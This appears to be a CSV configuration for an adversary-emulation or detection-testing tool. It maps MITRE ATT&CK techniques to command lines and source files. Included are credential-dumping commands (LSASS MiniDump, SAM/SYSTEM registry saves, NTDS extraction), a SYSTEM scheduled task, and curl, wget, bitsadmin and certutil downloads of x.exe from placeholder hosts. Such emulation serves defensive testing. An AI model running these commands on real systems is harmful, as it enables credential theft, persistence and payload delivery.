Technique,OldCount,OtherCount,ExecuteCount,NewCount,Variants,Tactic,Technique,GDT approves,Link,,,,,,Exec Operations
T1003.001,3,1,2,33,Open process + 2x Execute,Credential Access,OS Credential Dumping: LSASS Memory,1,https://attack.mitre.org/techniques/T1003/001/,,,,,,16
exec,"""procdump -ma lsass.exe lsass_dump""",,,,,,,,,,,,,,16
exec,"""rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full""",,,,,,,,,,,,,,16
src,T1003.001.V1.cpp,,,,,,,,,,,,,,16
T1003.002,3,0,3,48,3x Execute,Credential Access,OS Credential Dumping: Security Account Manager,1,https://attack.mitre.org/techniques/T1003/002/,,,,,,16
exec,"""reg save HKLM\\sam sam""",,,0,,,,,,,,,,,16
exec,"""reg save HKLM\\system system""",,,0,,,,,,,,,,,16
exec,"""pwdumpx.exe > credentials.txt""",,,0,,,,,,,,,,,16
T1003.003,1,0,1,16,1 Execute,Credential Access,OS Credential Dumping: NTDS,1,https://attack.mitre.org/techniques/T1003/003/,,,,,,16
exec,"""msadcs.exe \""NTDS.dit\"" -s \""SYSTEM\"" -p a.txt --users-csv a.csv""",,,,,,,,,,,,,,16
T1003.004,1,1,0,1,1 Registry,Credential Access,OS Credential Dumping: LSA Secrets,1,https://attack.mitre.org/techniques/T1003/004/,,,,,,16
src,T1003.004.V1.cpp,,,,,,,,,,,,,,16
T1010.000,1,1,0,1,Other,Discovery,Application Window Discovery,1,https://attack.mitre.org/techniques/T1010/,,,,,,16
src,T1010.000.V1.cpp,,,,,,,,,,,,,,16
T1053.005,1,0,1,16,1 execute,"Execution, Persistence, Privilege Escalation,",Scheduled Task/Job: Scheduled Task,1,https://attack.mitre.org/techniques/T1053/005/,,,,,,16
exec,"""schtasks /create /tn \""abc\"" /tr C:\\x.exe /sc ONLOGON /ru \""System\""""",,,,,,,,,,,,,,16
T1056.001,1,1,0,1,,"Collection, Credential Access",Input Capture: Keylogging,1,https://attack.mitre.org/techniques/T1056/001/,,,,,,16
src,T1056.001.V1.cpp,,,,,,,,,,,,,,16
T1059.001,0,2,2,34,PWSH  -exec ??,Execution,Command and Scripting Interpreter: PowerShell,1,https://attack.mitre.org/techniques/T1059/001/,,,,,,16
exec,"""powershell.exe Start-Process -FilePath calc.exe""",,,,,,,,,,,,,,16
exec,"""powershell.exe Invoke-Command -ScriptBlock { runme.exe }""",,,,,,,,,,,,,,16
T1082.000,5,2,3,50,,Discovery,System Information Discovery,1,https://attack.mitre.org/techniques/T1082/,,,,,,16
exec,"""systeminfo.exe /FO LIST""",,,,,,,,,,,,,,16
exec,"""ver >> %temp%\\download""",,,,,,,,,,,,,,16
exec,"""vssadmin list shadows""",,,,,,,,,,,,,,16
src,T1082.000.V1.cpp,,,,,,,,,,,,,,16
src,T1082.000.V2.cpp,,,,,,,,,,,,,,16
T1083.000,2,1,1,17,,Discovery,File and Directory Discovery,1,https://attack.mitre.org/techniques/T1083/,,,,,,16
exec,"""dir \""c:\\Program Files\\\"" >> %temp%\\exported_data""",,,,,,,,,,,,,,16
src,T1083.000.V2.cpp,,,,,,,,,,,,,,16
T1091.000,1,1,0,1,,"Lateral Movement, Initial Access",Replication Through Removable Media,1,https://attack.mitre.org/techniques/T1091/,,,,,,16
T1105.000,5,1,4,65,,Command and Control,Ingress Tool Transfer,1,https://attack.mitre.org/techniques/T1105/,,,,,,16
exec,"""curl http:\\www.abc.xyz\\x.exe""",,,,,,,,,,,,,,16
exec,"""wget http:\\www.abc.xyz\\x.exe""",,,,,,,,,,,,,,16
exec,"""bitsadmin /create jb1""","""bitsadmin /addfile jb1 \""http://www.xyz.com/x.exe\"" \""C:\\temp\\x.exe\""""","""bitsadmin /resume jb1""","""bitsadmin / complete jb1""",,,,,,,,,,,16
exec,"""certutil -urlcache -split -f http://www.xyz.com/x.exe C:\\temp\\x.exe""",,,,,,,,,,,,,,16
src,T1105.000.V1.cpp,,,,,,,,,,,,,,16
T1106.000,1,1,0,1,,Execution,Native API,1,https://attack.mitre.org/techniques/T1106/,,,,,,16
src,T1106.000.V1.cpp,,,,,,,,,,,,,,16
